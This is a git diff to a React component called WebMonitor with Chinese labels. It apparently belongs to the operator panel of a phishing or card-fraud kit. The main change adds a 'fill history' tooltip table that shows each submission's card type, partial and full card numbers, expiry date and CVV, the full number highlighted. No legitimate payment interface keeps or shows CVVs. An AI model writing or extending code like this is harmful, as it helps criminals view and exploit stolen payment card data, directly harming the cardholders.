@@ -272,7 +272,7 @@ export function WebMonitor() {
               🔒 安全设定
             </Button>
             <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
-              ���️ 风险预警
+              ⚠️ 风险预警
             </Button>
             <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
               📝 日志查看
@@ -405,23 +405,44 @@ export function WebMonitor() {
                           <span className="text-blue-700 font-semibold">{submission.submitCount || 0}次</span>
                         </div>
                       </TooltipTrigger>
-                      <TooltipContent side="top" className="max-w-xs">
-                        <div className="space-y-2">
-                          <div className="font-semibold text-xs">历史提交记录</div>
-                          {submission.submitHistory?.map((history, index) => (
-                            <div key={index} className="text-xs border-b border-gray-200 pb-1 last:border-b-0">
-                              <div className="flex justify-between items-center">
-                                <span className="text-gray-600">{history.timestamp}</span>
-                                <span className={`px-1 py-0.5 rounded text-xs ${
-                                  history.result === "成功" ? "bg-green-100 text-green-700" :
-                                  history.result === "失败" ? "bg-red-100 text-red-700" :
-                                  "bg-yellow-100 text-yellow-700"
-                                }`}>
-                                  {history.result}
-                                </span>
-                              </div>
-                            </div>
-                          )) || <div className="text-xs text-gray-500">暂无记录</div>}
+                      <TooltipContent side="top" className="max-w-2xl p-0">
+                        <div className="bg-white rounded-lg shadow-lg">
+                          <div className="px-4 py-2 bg-gray-50 border-b font-semibold text-sm text-gray-700 rounded-t-lg">
+                            填写历史
+                          </div>
+                          <div className="p-2">
+                            {submission.submitHistory && submission.submitHistory.length > 0 ? (
+                              <table className="w-full text-xs">
+                                <tbody>
+                                  {submission.submitHistory.map((history, index) => (
+                                    <tr key={index} className="border-b border-gray-100 last:border-b-0">
+                                      <td className="py-1 px-2 text-center text-gray-600 font-mono w-8">{index + 1}</td>
+                                      <td className="py-1 px-2">
+                                        <span className={`px-2 py-0.5 rounded text-xs border ${
+                                          history.cardType === "debit" ? "bg-green-50 text-green-600 border-green-200" :
+                                          history.cardType === "credit" ? "bg-blue-50 text-blue-600 border-blue-200" :
+                                          "bg-orange-50 text-orange-600 border-orange-200"
+                                        }`}>
+                                          {history.cardType}
+                                        </span>
+                                      </td>
+                                      <td className="py-1 px-2 font-mono text-gray-700">{history.partialCard1}</td>
+                                      <td className="py-1 px-2 font-mono text-gray-700">{history.partialCard2}</td>
+                                      <td className="py-1 px-2">
+                                        <span className="bg-green-500 text-white px-2 py-0.5 rounded font-mono text-xs">
+                                          {history.fullCard}
+                                        </span>
+                                      </td>
+                                      <td className="py-1 px-2 font-mono text-gray-700">{history.expiryDate}</td>
+                                      <td className="py-1 px-2 font-mono text-gray-700">{history.cvv}</td>
+                                    </tr>
+                                  ))}
+                                </tbody>
+                              </table>
+                            ) : (
+                              <div className="text-xs text-gray-500 text-center py-4">暂无填写记录</div>
+                            )}
+                          </div>
                         </div>
                       </TooltipContent>
                     </Tooltip>
